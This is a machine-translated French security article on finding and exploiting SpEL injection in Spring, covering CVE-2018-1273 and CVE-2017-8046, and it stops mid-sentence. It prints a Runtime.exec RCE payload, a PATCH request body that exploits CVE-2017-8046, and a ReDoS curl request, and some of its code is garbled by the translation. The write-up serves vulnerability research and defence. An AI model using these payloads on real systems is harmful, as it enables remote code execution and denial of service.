<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üöç üë®‚Äç‚öñÔ∏è üë®üèº‚Äçüè≠ Injection de spels üè• üêö üç´</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Intro 


 En travaillant et en recherchant divers services, nous pouvons de plus en plus respecter le cadre de printemps. Et l'√©tape logique consiste ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Injection de spels</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/433034/"><img src="https://habrastorage.org/webt/me/ul/p3/meulp3hfrqubkhj4pxdhmslxeca.jpeg"><br><h1 id="intro">  Intro </h1><br><p>  En travaillant et en recherchant divers services, nous pouvons de plus en plus respecter le cadre de printemps.  Et l'√©tape logique consiste √† se familiariser avec sa structure et ses √©ventuelles vuln√©rabilit√©s. </p><br><p>  Les vuln√©rabilit√©s qui conduisent √† l'ex√©cution de code sont les plus int√©ressantes pour tout Pentester. </p><br><p>  Une fa√ßon d'obtenir RCE au printemps est d'injecter des expressions SpEL. </p><br><p>  Dans cet article, nous allons essayer de comprendre ce qu'est le SpEL, o√π il peut √™tre trouv√©, quelles sont les caract√©ristiques d'utilisation et comment trouver de telles injections. </p><a name="habracut"></a><br><h1 id="what">  Quoi? </h1><br><p>  <strong>SpEL</strong> est un langage d'expression cr√©√© pour Spring Framework qui prend en charge les requ√™tes et la gestion graphique des objets lors de l'ex√©cution. <br>  Il est √©galement important de noter que SpEL a √©t√© cr√©√© en tant qu'API qui vous permet de l'int√©grer dans d'autres applications et frameworks. </p><br><h1 id="gde-mozhno-vstretit">  O√π puis-je me rencontrer? </h1><br><p>  Il est logique que le <strong>Spring Framework</strong> SpEL soit utilis√© en permanence.  Un bon exemple est Spring Security, o√π les droits sont attribu√©s √† l'aide d'expressions SpEL: </p><br><pre><code class="java hljs"><span class="hljs-meta"><span class="hljs-meta">@PreAuthorize</span></span>(<span class="hljs-string"><span class="hljs-string">"hasPermission(#contact, 'admin')"</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">deletePermission</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Contact contact, Sid recipient, Permission permission)</span></span></span></span>;</code> </pre> <br><p><img src="https://habrastorage.org/webt/2g/rq/gp/2grqgp1bk2lc_ajrxtbl4rcsrq4.png"></p><br><p>  Apache Camel utilise l'API SpEL;  Voici des exemples de sa documentation. <br>  Formation de lettres √† l'aide d'expressions SpEL: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">route</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">from</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">uri</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"direct:foo"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">spel</span></span></span><span class="hljs-tag">&gt;</span></span>#{request.headers['foo'] == 'bar'}<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">spel</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">to</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">uri</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"direct:bar"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">route</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Ou vous pouvez utiliser une r√®gle √† partir d'un fichier externe, par exemple, pour sp√©cifier un en-t√™te: </p><br><pre> <code class="javascript hljs">.setHeader(<span class="hljs-string"><span class="hljs-string">"myHeader"</span></span>).spel(<span class="hljs-string"><span class="hljs-string">"resource:classpath:myspel.txt"</span></span>)</code> </pre> <br><p>  Voici quelques exemples vus sur GitHub: <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">https://github.com/jpatokal/openflights</a> </p><br><p><img src="https://habrastorage.org/webt/se/wd/ge/sewdgepwblvm0cslrn30d5glbem.png"></p><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">https://github.com/hbandi/LEP</a> </p><br><p><img src="https://habrastorage.org/webt/xm/nr/h2/xmnrh2rhtdc_eqlfpgqqmukaemu.png"></p><br><h1 id="osnovy-spring-framework-i-spel">  Cadre Spring et principes de base de SpEL </h1><br><p>  Pour que le lecteur comprenne mieux ce que sont les injections SpEL, vous devez vous familiariser un peu avec Spring et SpEL. </p><br><p>  Un √©l√©ment cl√© du Spring Framework est le Spring Container.  Un conteneur cr√©e des objets, les relie, les configure et les g√®re de la cr√©ation √† la destruction. </p><br><p>  Pour contr√¥ler les composants qui composent l'application, Spring Container utilise <br>  Injection de d√©pendance.  C'est lorsque les objets sont configur√©s √† l'aide d'entit√©s externes appel√©es Spring Beans - famili√®rement appel√©s "beans". </p><br><p>  Spring Container r√©cup√®re les m√©tadonn√©es de configuration du bean qui sont n√©cessaires pour obtenir les informations suivantes: des instructions sur les objets √† instancier et comment les configurer via des m√©tadonn√©es. </p><br><p>  Les m√©tadonn√©es peuvent √™tre obtenues de 3 mani√®res: </p><br><ul><li>  XML </li><li>  Annotations Java </li><li>  Code Java </li></ul><br><p>  Et un autre point important pour nous est le contexte d'application. </p><br><p>  <strong>ApplicationContext</strong> est l'interface principale d'une application Spring qui fournit des informations de configuration d'application.  Il est en lecture seule au moment de l'ex√©cution, mais peut √™tre recharg√© si n√©cessaire et pris en charge par l'application.  Le nombre de classes qui impl√©mentent l'interface ApplicationContext est disponible pour divers param√®tres de configuration et types d'application.  En fait, c'est l'application Spring elle-m√™me.  Le contexte offre √©galement la possibilit√© de r√©pondre √† divers √©v√©nements qui se produisent dans l'application et de contr√¥ler le cycle de vie des beans. </p><br><p><img src="https://habrastorage.org/webt/gz/pg/td/gzpgtdz46xowwzhkoa4vsld7utq.png"></p><br><p>  Attardons-nous maintenant directement sur les m√©thodes de d√©finition d'un bean et d'utilisation des expressions SpEL. </p><br><p>  <strong>Bean.xml</strong> </p><br><p>  Un exemple d'utilisation typique est l'int√©gration de SpEL dans la cr√©ation de XML ou de d√©finitions annot√©es de composants de bean: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">‚Äúexmple</span></span></span><span class="hljs-tag">" </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"org.spring.samples.NumberGuess"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"randomNumber"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{ T(java.lang.Math).random() * 100.0 }"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"defaultLocale"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{ systemProperties['user.region'] }"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"defaultLocale2"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"${user.region}"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Voici une partie du code du fichier Bean.xml, pour un seul de ses beans.  Il convient de pr√™ter attention √† l'id du bac, par lequel il est accessible, et aux propri√©t√©s.  Parce que  Dans le cadre de cet article, nous envisageons la possibilit√© d'utiliser SpEL, puis dans l'exemple, plusieurs options pour √©crire de telles expressions seront donn√©es. </p><br><p>  Pour indiquer √† Spring que les expressions SpEL viennent ensuite, le caract√®re # est utilis√© et l'expression elle-m√™me est plac√©e entre accolades: <code>#{SpEL_expression}</code> .  Les propri√©t√©s peuvent √™tre r√©f√©renc√©es √† l'aide du caract√®re $ et en encadrant le nom de la propri√©t√© entre accolades: <code>${someProperty}</code> .  Les espaces r√©serv√©s de propri√©t√© ne peuvent pas contenir d'expressions SpEL, mais les expressions peuvent contenir des r√©f√©rences de propri√©t√©: </p><br><pre> <code class="json hljs"><span class="hljs-string"><span class="hljs-string">"#{${someProperty}"</span></span></code> </pre> <br><p>  Ainsi, vous pouvez appeler n'importe quelle classe Java dont nous avons besoin ou, par exemple, acc√©der aux variables d'environnement, qui peuvent √™tre utiles pour d√©terminer le nom d'utilisateur ou la version du syst√®me. </p><br><p>  La commodit√© de cette m√©thode de sp√©cification des beans est la possibilit√© de les modifier sans recompiler l'application enti√®re, modifiant ainsi le comportement de l'application. </p><br><p>  Depuis l'application elle-m√™me, vous pouvez acc√©der √† ce bean en utilisant l'interface ApplicationContext, comme indiqu√© ci-dessous: </p><br><pre> <code class="java hljs">ApplicationContext ctx = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ClassPathXmlApplicationContext(‚ÄúBean.xml‚Äù); MyExpression example = ctx.getBean(‚Äúexample<span class="hljs-string"><span class="hljs-string">", MyExpression.class); "</span></span> + <span class="hljs-string"><span class="hljs-string">"System.out.println(‚ÄúNumber : "</span></span> + example.getValue()); System.out.println(‚ÄúLocale : <span class="hljs-string"><span class="hljs-string">" + example.getDefaultLocale()); System.out.println(‚ÄúLocale : "</span></span> + example.getDefaultLocale2());</code> </pre><br><p>  C'est-√†-dire  √† l'int√©rieur de l'application, nous obtenons simplement les valeurs des param√®tres bin qui contiennent des expressions SpEL.  Spring, ayant re√ßu une telle valeur, ex√©cute l'expression et renvoie le r√©sultat final.  N'oubliez pas non plus que ce code ne fonctionnera pas sans les getters correspondants, mais que leur description d√©passe le cadre de l'article. </p><br><p>  Une autre fa√ßon de sp√©cifier les beans est la m√©thode d'annotation AnnotationBase - les valeurs des param√®tres sont d√©finies √† l'int√©rieur de l'annotation pour certaines classes.  Dans ce cas, l'utilisation de variables n'est pas possible. </p><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">FieldValueTestBean</span></span></span><span class="hljs-class"> @</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Value</span></span></span><span class="hljs-class">("#</span></span>{ systemProperties[<span class="hljs-string"><span class="hljs-string">'user.region'</span></span>] }<span class="hljs-string"><span class="hljs-string">") private String defaultLocale; public void setDefaultLocale(String defaultLocale) { this.defaultLocale = defaultLocale; } public String getDefaultLocale() { return this.defaultLocale; } }</span></span></code> </pre> <br><p>  Pour pouvoir utiliser des variables, lors de la cr√©ation d'expressions SpEL, nous devons utiliser l'interface ExpressionParser.  Et puis une classe appara√Æt dans le code d'application, semblable √† l'exemple suivant: </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parseExpressionInterface</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Person personObj,String property)</span></span></span><span class="hljs-function"> </span></span>{ ExpressionParser parser = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SpelExpressionParser(); Expression exp = parser.parseExpression(property+<span class="hljs-string"><span class="hljs-string">" == 'Input'"</span></span>); StandardEvaluationContext testContext = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StandardEvaluationContext(personObj); <span class="hljs-keyword"><span class="hljs-keyword">boolean</span></span> result = exp.getValue(testContext, Boolean.class);</code> </pre> <br><p>  ExpressionParser convertit une expression de cha√Æne en un objet Expression.  Ainsi, la valeur de l'expression analys√©e peut √™tre obtenue dans le cadre de EvaluationContext.  Ce EvaluationContext sera le seul objet √† partir duquel toutes les propri√©t√©s et variables de la cha√Æne EL seront disponibles. </p><br><p>  Il convient de noter un autre fait important.  Avec cette m√©thode d'utilisation de SpEL, il suffit que l'expression de cha√Æne contienne # si, en plus de l'expression elle-m√™me, elle contient des litt√©raux de cha√Æne. </p><br><p>  De tout ce qui pr√©c√®de, il convient de se rappeler deux choses: <br>  1) S'il est possible de rechercher par code d'application, vous devez rechercher ces mots cl√©s: SpelExpressionParser, EvaluationContext et parseExpression. <br>  2) Pointeurs importants pour Spring <code>#{SpEL}</code> , <code>${someProperty}</code> et <code>T(javaclass)</code> <br>  Si vous souhaitez en savoir plus sur Spring et SpEL, nous vous recommandons de faire attention √† la documentation <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">docs.spring.io</a> . </p><br><h1 id="chto-voobsche-mozhet-spel">  Que peut faire SpEL? </h1><br><p>  Selon la documentation, SpEL prend en charge les fonctionnalit√©s suivantes: </p><br><ul><li>  Expressions litt√©rales </li><li>  Op√©rateurs bool√©ens et relationnels </li><li>  Expressions r√©guli√®res </li><li>  Expressions de classe </li><li>  Acc√®s aux propri√©t√©s, tableaux, listes, cartes </li><li>  Appel de m√©thode </li><li>  Op√©rateurs relationnels </li><li>  Affectation </li><li>  Appel des constructeurs </li><li>  R√©f√©rences Bean </li><li>  Construction de la baie </li><li>  Listes en ligne </li><li>  Cartes en ligne </li><li>  Op√©rateur ternaire </li><li>  Variables </li><li>  Fonctions d√©finies par l'utilisateur </li><li>  Projection de collection </li><li>  S√©lection de collection </li><li>  Expressions mod√®les </li></ul><br><p>  Comme nous pouvons le voir, la fonctionnalit√© SpEL est tr√®s riche, ce qui peut nuire √† la s√©curit√© du projet si l'entr√©e utilisateur entre dans ExpressionParser.  Par cons√©quent, Spring lui-m√™me recommande d'utiliser, au lieu d'un StandardEcalutionContext enti√®rement fonctionnel, un SimpleEvaluationContext plus all√©g√©. </p><br><p>  En bref, de l'importance pour nous, SimpleEvaluationContext n'a pas la capacit√© d'acc√©der aux classes Java et de r√©f√©rencer d'autres beans. </p><br><p>  Une description compl√®te des fonctionnalit√©s est mieux explor√©e sur le site Web de documentation: <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">StandardEvaluationContext</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">SimpleEvaluationContext</a> </p><br><p>  Certaines corrections sont m√™me bas√©es sur la diff√©rence de fonctionnalit√© de SpEL, qui s'ex√©cute dans diff√©rents contextes, mais nous en reparlerons un peu plus tard. </p><br><p>  Pour que tout soit vraiment clair, nous donnons un exemple.  Nous avons une ligne clairement malveillante contenant une expression SpEL: </p><br><pre> <code class="java hljs">String inj = <span class="hljs-string"><span class="hljs-string">"T(java.lang.Runtime).getRuntime().exec('calc.exe')"</span></span>;</code> </pre> <br><p>  Et il y a deux contextes: </p><br><pre> <code class="java hljs">StandardEvaluationContext std_c = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StandardEvaluationContext();</code> </pre> <br><p>  et </p><br><pre> <code class="java hljs">EvaluationContext simple_c = SimpleEvaluationContext.forReadOnlyDataBinding ().build();</code> </pre> <br><p>  Expression exp = parser.parseExpression (inj); <br> <code>java exp.getValue(std_c);</code>  - <strong>la calculatrice sera lanc√©e</strong> <br> <code>java exp.getValue(simple_c);</code>  - <strong>nous obtiendrons un message d'erreur</strong> </p><br><p>  Un point tout aussi int√©ressant est que nous pouvons commencer √† traiter l'expression sans sp√©cifier aucun contexte: <code>exp.getValue();</code> <br>  Dans ce cas, l'expression sera ex√©cut√©e dans le contexte standard et, par cons√©quent, le code malveillant sera ex√©cut√©.  Par cons√©quent, si vous √™tes un programmeur et utilisez Spring, n'oubliez jamais de d√©finir le contexte dans lequel l'expression doit s'ex√©cuter. </p><br><p>  Nous avons dit un peu plus t√¥t que certaines corrections sont bas√©es sur les diff√©rences entre les capacit√©s SpEL dans les contextes.  Prenons un exemple d'un tel correctif. </p><br><p>  <strong>CVE 2018-1273 Spring Data Commons</strong> <br>  Cette vuln√©rabilit√© a √©t√© trouv√©e dans la m√©thode setPropertyValue et √©tait bas√©e sur deux probl√®mes: <br>  1) Assainissement insuffisant des valeurs de la variable qui tombe dans ExpressionParser. <br>  2) Ex√©cution de l'expression dans le cadre du contexte standard. </p><br><p>  Voici une capture d'√©cran de la partie vuln√©rable du code: </p><br><p><img src="https://habrastorage.org/webt/rb/84/_7/rb84_76_bpq3ywrf-icytp5hvs8.png"></p><br><p>  Parce que  le nom de la propri√©t√© ne n√©cessitait pas de traitement complexe dans le cadre de SpEL; la solution logique √©tait de remplacer le contexte, r√©sultant en le code suivant: </p><br><p><img src="https://habrastorage.org/webt/xw/re/ue/xwreueydsgforfjf365mwdrpcuc.png"></p><br><p>  Les captures d'√©cran montrent les parties du code qui d√©finissent le contexte et l'expression qui seront ex√©cut√©es.  Mais l'ex√©cution de l'expression se produit ailleurs: </p><br><pre> <code class="java hljs">expression.setValue(context, value);</code> </pre> <br><p>  C'est ici qu'il est indiqu√© que nous ex√©cutons une expression SpEL pour la valeur de valeur dans le contexte donn√©. <br>  L'utilisation de SimpleEvaluationContext a aid√© √† prot√©ger contre l'impl√©mentation de Java Class dans parseExpression, et maintenant au lieu d'ex√©cuter du code dans le journal du serveur, nous verrons une erreur: </p><br><pre> <code class="java hljs">Type cannot be found <span class="hljs-string"><span class="hljs-string">'java.lang.Runtime'</span></span></code> </pre> <br><p>  Mais cela n'a pas r√©solu le probl√®me avec le manque d'assainissement suffisant et a conserv√© la capacit√© de mener une attaque redos: </p><br><pre> <code class="bash hljs">curl -X POST http://localhost:8080/account -d <span class="hljs-string"><span class="hljs-string">"name['aaaaaaaaaaaaaaaaaaaaaaaa!'%20matches%20'%5E(a%2B)%2B%24']=test"</span></span></code> </pre> <br><p>  Par cons√©quent, le correctif suivant incluait d√©j√† le nettoyage du nom du param√®tre. </p><br><h1 id="ot-teorii-k-praktike">  De la th√©orie √† la pratique! </h1><br><p>  Examinons maintenant plusieurs fa√ßons de rechercher une injection SpEL √† l'aide de la m√©thode White Box. </p><br><h2 id="step-by-step-cve-2017-8046">  √âtape par √©tape CVE-2017-8046 </h2><br><p>  Vous devez d'abord trouver un endroit pour traiter les expressions SpEL.  Pour ce faire, vous pouvez simplement utiliser notre recommandation et trouver des mots cl√©s dans le code.  Rappelez-vous ces mots: SpelExpressionParser, EvaluationContext et parseExpression. </p><br><p>  Une autre option consiste √† utiliser divers plugins pour trouver des erreurs dans le code.  Jusqu'√† pr√©sent, le seul plugin qui pointe vers une √©ventuelle injection de SpEL √©tait findecbugs-cli. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">https://github.com/find-sec-bugs</a> </p><br><p>  Nous avons donc trouv√© l'endroit qui nous int√©resse dans le code.  Disons que l'utilisation de findecbugs-cli: </p><br><p><img src="https://habrastorage.org/webt/wg/_w/s5/wg_ws5vbnh1z6vds1-gxjc3zhk0.png"></p><br><p>  Dans le code d'application, nous verrons ce qui suit: </p><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">PathToSpEL</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> SpelExpressionParser SPEL_EXPRESSION_PARSER = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SpelExpressionParser(); <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> List&lt;String&gt; APPEND_CHARACTERS = Arrays.asList(<span class="hljs-string"><span class="hljs-string">"-"</span></span>); <span class="hljs-comment"><span class="hljs-comment">/** * Converts a patch path to an {</span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@link</span></span></span><span class="hljs-comment"> Expression}. * * </span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@param</span></span></span><span class="hljs-comment"> path the patch path to convert. * </span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@return</span></span></span><span class="hljs-comment"> an {</span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@link</span></span></span><span class="hljs-comment"> Expression} */</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> Expression </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">pathToExpression</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String path)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> SPEL_EXPRESSION_PARSER.parseExpression(pathToSpEL(path)); }</code> </pre> <br><p>  L'√©tape suivante consiste √† d√©couvrir o√π la variable de chemin entre dans l'analyseur d'expression.  L'un des moyens plut√¥t pratiques et gratuits serait d'utiliser la fonction IntelijIdea IDE - Analyze Dataflow: </p><br><p><img src="https://habrastorage.org/webt/gd/ud/ag/gdudag-ykwbmvin_70mowuh838u.png"></p><br><p>  En d√©roulant la cha√Æne, par exemple, pour remplacer et √©tudier les m√©thodes et classes sp√©cifi√©es, nous obtenons ce qui suit: </p><br><p>  La m√©thode ReplaceOperation prend la valeur de la variable de chemin. </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ReplaceOperation</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String path, Object value)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">super</span></span>(<span class="hljs-string"><span class="hljs-string">"replace"</span></span>, path, value); }</code> </pre> <br><p>  Et pour appeler la m√©thode replace, vous devez passer la variable ¬´op¬ª avec la valeur ¬´replace¬ª √† JSON. </p><br><pre> <code class="java hljs">JsonNode opNode = elements.next(); String opType = opNode.get(<span class="hljs-string"><span class="hljs-string">"op"</span></span>).textValue(); <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (opType.equals(<span class="hljs-string"><span class="hljs-string">"replace"</span></span>)) { ops.add(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ReplaceOperation(path, value));</code> </pre> <br><p>  De m√™me, nous trouvons tous les endroits o√π l'utilisateur peut transmettre la valeur dont il a besoin √† la variable path.  Et puis l'une des options d'exploitation de la vuln√©rabilit√© ressemblera √† ceci: <br>  M√©thode de demande: PATCH <br>  Organe de demande: </p><br><pre> <code class="json hljs">[{ <span class="hljs-attr"><span class="hljs-attr">"op"</span></span> : <span class="hljs-string"><span class="hljs-string">"add"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"path"</span></span> : <span class="hljs-string"><span class="hljs-string">"T(java.lang.Runtime).getRuntime().exec(\"calc.exe\").x"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"value"</span></span> : <span class="hljs-string"><span class="hljs-string">"pwned"</span></span> }]</code> </pre> <br><h2 id="ispolzovanie-lgtm-ql">  Utilisation de LGTM QL </h2><br><p>  L'utilisation de LGTM QL (pour les besoins de cet article, nous le r√©duisons simplement √† QL) est une autre fa√ßon int√©ressante de rechercher des vuln√©rabilit√©s. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">https://lgtm.com</a> </p><br><p>  Il devrait imm√©diatement stipuler son absence.  Vous pouvez analyser gratuitement les projets qui se trouvent dans des r√©f√©rentiels ouverts sur GitHub, car  Pour prendre une photo du projet, LGTM t√©l√©charge le projet sur son serveur et le compile l√†.  Mais si cela ne vous d√©range pas, le LGTM QL vous ouvrira de grandes opportunit√©s dans l'analyse du code d'application. </p><br><p>  Qu'est-ce que l'analyse d'application QL? </p><br><p>  Pour commencer, comme nous l'avons d√©j√† dit, vous devrez cr√©er un instantan√© de l'application. </p><br><p>  Lorsque l'instantan√© est pr√™t, et cela peut prendre plusieurs heures, vous pouvez commencer √† √©crire une requ√™te de type SQL dans le cadre de la syntaxe QL.  Pour ce faire, vous pouvez utiliser le plugin pour Eclipse ou agir directement dans la console sur la page QL du projet. </p><br><p>  Parce que  Maintenant, nous consid√©rons Spring, et c'est le cadre de Java, vous devrez d√©crire la classe qui vous int√©resse et la m√©thode de cette classe, dont 